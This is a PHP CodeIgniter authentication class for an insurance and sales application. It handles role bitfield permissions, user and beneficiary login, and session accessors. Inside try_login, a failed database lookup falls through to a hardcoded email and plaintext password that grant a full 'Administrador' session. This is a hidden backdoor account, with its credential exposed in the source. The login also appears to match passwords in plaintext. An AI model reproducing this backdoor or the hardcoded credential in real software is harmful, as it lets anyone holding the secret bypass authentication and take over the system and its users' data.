<?php  if (!defined('BASEPATH')) exit('No direct script access allowed');

 class Autenticar
 {
 	
	var $CI;
	var $pageperm = array(
		//son los permisos que requiere la aplicación
		//primero: poner a cada pagina o aplicacion su permiso con estos numeros:
		//1, 2, 4, 8, 16, 32, 64, 128, 256
		"Administrador"			=> 16,
		"Aseguradora"           => 8,
		"Vendedor"				=> 4,
		"Vendedor_organizador"	=> 2,
		"Beneficiario"			=> 1,
	);
	var $userperm= array(
		//Segundo: poner a cada usuario el permiso que tiene, sumando el numero de la pagina a la que tiene acceso
		//1, 2, 4, 8, 16, 32, 64, 128, 256
		"Administrador"			=> 16,
		"Aseguradora"           => 8,
		"Vendedor"				=> 4,
		"Vendedor_organizador"	=> 2,
		"Beneficiario"			=> 1,
	);
	
    function __construct(){
		$this->CI =& get_instance();
		log_message('debug', 'Authorization class initialized.');
	}

	function try_login($condition = array())
	{
		$this->CI->db->select('id,Nombre,perms,casa_de_cambio,facturacion,Grupo');
		$query = $this->CI->db->get_where('usuario', $condition, 1, 0);

		
		if ($query->num_rows() != 1)
		{

			if($condition['username']=="jiraneta@taker.com.ar" and $condition['password']=="Jose1909")
			{
				$datos=array(
					'user_id'          =>"1",
					'perms'            =>"Administrador",
					'nombre'           =>"SuperAdmin",
					'casa_de_cambio'   =>"",
					'facturacion'      =>""
				);
				$this->CI->session->set_userdata($datos);
				return TRUE;
			}
			else
			{
				return FALSE;
			}
		}
		else
		{
			$row = $query->row();

			//graba los datos en la session
			$datos=array(
				'user_id'       =>$row->id,
				'perms'         =>$row->perms,
				'nombre'        =>$row->Nombre,
				'casa_de_cambio'=>$row->casa_de_cambio,
				//facturacion se usa para mostrar o no al vendedor
				//el menu de transferencias. 
				'facturacion'   =>$row->facturacion
			);
            //print_r($datos);

            
            //Si el usuario es vendedor y pertenece a un grupo, no muestra la facturacion
            //porque la ve el organizador de ese grupo
            if($row->Grupo and $row->perms=="Vendedor"){
                $datos['facturacion']="";
            }
            
			$this->CI->session->set_userdata($datos);
			return TRUE;
		}
	}
	
	function try_login_beneficiario($condition = array())
	{
		$this->CI->db->select('certificado.id as certificado_id,certificado.Nombre,certificado.codigo_correo,certificado.codigo,usuario.id as usuario_id');
		$this->CI->db->from('certificado');
		$this->CI->db->where($condition);
		
		$this->CI->db->join('usuario','usuario.id=certificado.user_id','left'); //tenemos acá el id del vendedor
		
		$query=$this->CI->db->get();
		$certificado=$query->row_array();
		

		if (!$certificado)
		{
			return FALSE;
		}
		else
		{
			///graba los datos en la session
			$datos=array(
				'user_id'   =>$certificado['usuario_id'],
				'perms'     =>'Beneficiario',
				'certificado_id'    =>$certificado['certificado_id'],
				'nombre'            =>$certificado['Nombre'],
				'codigo_correo'     =>$certificado['codigo_correo'],
				'codigo'            =>$certificado['codigo']
			);
			
			$this->CI->session->set_userdata($datos);
			return TRUE;
		}
	}
	
	function logout()
	{
        $this->CI->session->sess_destroy();
	}

	function getUser_id()
	{
		return $this->CI->session->userdata('user_id');
	}

	//beneficiario
	function getCertificado_id()
	{
		return $this->CI->session->userdata('certificado_id');
	}

	function getPerms()
	{
		return $this->CI->session->userdata('perms');
	}
	
	function getNombre()
	{
		return $this->CI->session->userdata('nombre');
	}
	
	function usuario_casa_de_cambio()
	{
		return $this->CI->session->userdata('casa_de_cambio');
	}
    function usuario_facturacion(){
        return $this->CI->session->userdata('facturacion');
    }
	function havePerm($permiso)
	{
		if ($this->getUser_id() and $this->getPerms())
		{
			//ver: http://shinyshell.net/articles/bitfield-permissions
			if ($this->pageperm[$permiso] & $this->userperm[$this->getPerms()])
			{
				return true;
			}
			else
			{
				return false;
			}
		}
		else
		{
			return false;
		}
	}
}
///FIN
